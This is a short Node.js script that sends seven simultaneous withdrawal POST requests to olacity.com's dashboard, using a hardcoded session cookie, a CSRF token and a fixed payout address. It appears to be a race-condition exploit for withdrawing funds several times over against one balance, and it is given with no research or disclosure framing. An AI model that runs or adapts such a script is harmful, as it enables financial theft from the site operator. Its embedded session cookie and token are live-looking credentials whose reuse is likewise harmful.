const fs = require('fs')
var request = require('request')

var cookie = "laravel_session=eyJpdiI6IkZQak1uam9ITmVYXC9DXC9kRjRXVTNwdz09IiwidmFsdWUiOiJsaXloaVZvWDNVSkVKRURxVitvXC90YXdJZ2V2QXUxS3BGRlNJY2RyOE52cmZpRnpLc09kSVBcL09lT3p5OHhKaCsiLCJtYWMiOiJiNmQ2NDQzYjM4ZTRmOWZmZjVjODUzYWE3MDdhNmU3OTIzZDM3YTA2MzYwYWM5NjAxMTE0ODUxNDQxNTMyYzBmIn0%3D"


var withdraw = {
    url: 'https://olacity.com/dashboard/withdrawal/withdraw',
    headers: {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': 1,
        'Origin': 'https://olacity.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://olacity.com/dashboard/wallet',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8,zh-CN;q=0.7,zh;q=0.6',
        'Cookie': cookie
    },
    form: '_token=caFzrAyQEt9j3VJzp7zs0IVrN6GAH0Zng1bXXDDT&address=0332179159&amount=50',
    method: 'POST'
}

for (let index = 0; index < 7; index++) {
    request.post(withdraw, (err,res,body) => {
        console.log(body)
    })
}